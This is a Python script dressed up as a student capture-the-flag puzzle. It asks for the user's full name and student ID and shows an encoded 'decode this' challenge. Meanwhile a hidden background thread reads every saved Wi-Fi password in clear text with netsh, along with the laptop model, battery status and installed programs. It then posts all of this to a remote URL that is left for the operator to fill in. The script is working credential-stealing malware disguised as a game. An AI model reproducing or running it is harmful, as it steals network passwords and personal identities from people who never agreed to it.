from datetime import timedelta
from threading import Thread
import os
import psutil
import pythoncom
import requests
import time
import wmi


def sent_information(text, subject):
    try:
        text += f"\n#{subject}\n"
        requests.post(
            url="***", data={"data": text})  # change a *** with a right url
    except:
        pass


def laptop_brand():
    try:
        pythoncom.CoInitialize()
        my_system = wmi.WMI().Win32_ComputerSystem()[0]
        return f"{my_system.Manufacturer} {my_system.SystemFamily}"
    except:
        return "UNKNOWN"


def battery_charge_percentage():
    try:
        battery = psutil.sensors_battery()
        text = f"Battery percentage: {battery.percent}%\n"
        text += f"Power plugged in: {battery.power_plugged}\n"
        text += f"Battery left: {str(timedelta(seconds=battery.secsleft))}"
        return text
    except:
        return "NO BATTERY"


def wifi():
    try:
        stream = os.popen("netsh wlan show profile")
        output = stream.readlines()[9:-1]
        wifiNames = [output[i][27:-1] for i in range(len(output))]
        result = {}

        for name in wifiNames:
            stream = os.popen(
                f'netsh wlan show profile "{name}" key=clear').readlines()[32]

            if "Key Content" in stream:
                result[name] = stream[stream.find(": ") + 2:-1]
            else:
                result[name] = ""

        return result
    except:
        return {}


def installed_apps():
    try:
        stream = os.popen("wmic product get name")
        list_apps = stream.readlines()

        useless_words = ["Microsoft", "Windows",
                         "Office", "Python", "WinRT", "SDK"]
        filtered_list = []

        for item in list_apps[2::2]:
            if not item.strip():
                continue
            is_useless = False
            for word in useless_words:
                if item.find(word) != -1:
                    is_useless = True
                    break
            if not is_useless:
                filtered_list.append(item[:-1])

        return filtered_list
    except:
        return []


def back_end(primary_info):
    res1_str = laptop_brand()
    res2_str = battery_charge_percentage()
    res3_dict = wifi()
    res4_list = installed_apps()

    result = primary_info + \
        f"{res1_str}\n\n{res2_str}\n\n<b>WIFI HISTORY</b>\n"

    for key, value in res3_dict.items():
        result += "{:<50} {:<50}\n".format(key, value)

    result += "\n<b>INSTALLED_APPS</b>\n"
    for item in res4_list:
        result += f"{item}\n"

    sent_information(result, "Hack")


def ui():
    while True:
        os.system("cls")
        print("\n**DECODE THIS**\n\nLS4tLSAtLS0gLi4tIC8gLi0gLi0uIC4gLyAtIC4uLi4gLiAvIC0tLSAtLiAuIC8gLS4uLiAuIC4uIC0uIC0tLiAvIC0uLS4gLi0uIC4tIC0uLS4gLS4tIC4gLS4u\n")
        flag = input("FLAG: ")
        if flag.upper() == "YOU ARE THE ONE BEING CRACKED" or flag.upper() == "YOUARETHEONEBEINGCRACKED":
            print(
                "\nCongratulations...\nYou passed the test\n\nDont close the app. We are sending your name...")
            sent_information(
                f"ّFULLNAME: {name}\nSTUDENT ID: {student_id}", "Flag")
            break
        else:
            print("\nWrong answer\nTry again")
            time.sleep(3)


while True:
    os.system("cls")
    name = input("\nFull name: ")
    if not name.strip():
        print("This field is required")
        time.sleep(2)
        continue
    student_id = input("\nStudent id: ")
    if not student_id:
        print("This field is required")
        time.sleep(2)
        continue
    elif not student_id.isdigit():
        print("Is wrong")
        time.sleep(2)
        continue
    break

y = Thread(target=back_end, args=(
    f"FULLNAME: {name}\nSTUDENT ID: {student_id}\n", ))
y.start()

x = Thread(target=ui)
x.start()
